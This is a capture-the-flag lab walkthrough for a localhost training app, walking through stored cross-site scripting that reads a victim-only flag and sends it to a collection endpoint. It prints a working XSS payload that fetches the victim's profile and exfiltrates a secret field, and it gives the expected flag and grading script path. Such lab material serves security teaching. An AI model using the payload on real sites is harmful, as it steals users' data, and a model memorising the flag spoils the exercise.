# Activity 3 Walkthrough: Victim-Context Flag Exfiltration

## Objective
Use stored XSS to execute in victim context, read victim-only flag data, exfiltrate it, and submit FLAG3.

## Services
- Target app: `http://localhost:30000`
- XSS sink: `http://localhost:30000/reviews`
- Exfil endpoint: `http://localhost:30000/collect`
- Exfil viewer: `http://localhost:30000/api/exfil/latest`

## Attack Logic
1. Inject stored payload in comments.
2. Victim bot revisits comments periodically.
3. Payload executes in victim context.
4. Payload calls `/api/victim/profile` and extracts `secretFlag`.
5. Payload exfiltrates secret using `/collect`.

## Step-by-Step

### 1. Prepare payload
Use a payload with both victim-profile access and exfil target:
```html
<img src=x onerror="fetch('/api/victim/profile').then(r=>r.json()).then(d=>fetch('/collect?d='+encodeURIComponent(d.secretFlag)))">
```

### 2. Inject payload
1. Open `http://localhost:30000/reviews`.
2. Submit the payload as a comment.
3. Verify payload is visible in recent reviews.

### 3. Wait for victim execution
- Victim worker revisits automatically.
- Wait around 10-15 seconds.

### 4. Retrieve leaked value
Fetch exfil status:
```bash
curl -s http://localhost:30000/api/exfil/latest
```
Expected `latest` value:
```json
{"latest":"IITB{labg_a3_victim_context_exfil}", ...}
```

### 5. Fill submission files
Under `/home/labDirectory`:
- `xss-payload.txt`: payload used.
- `flag.txt`: paste only FLAG3.

### 6. Evaluate
```bash
bash /home/.evaluationScripts/evaluate.sh
```

## Troubleshooting
- If `latest` is empty, resubmit payload and wait one victim interval.
- Ensure payload includes both `/api/victim/profile` and `/collect`.
- If JSON parse errors occur in browser console, simplify payload and retry.
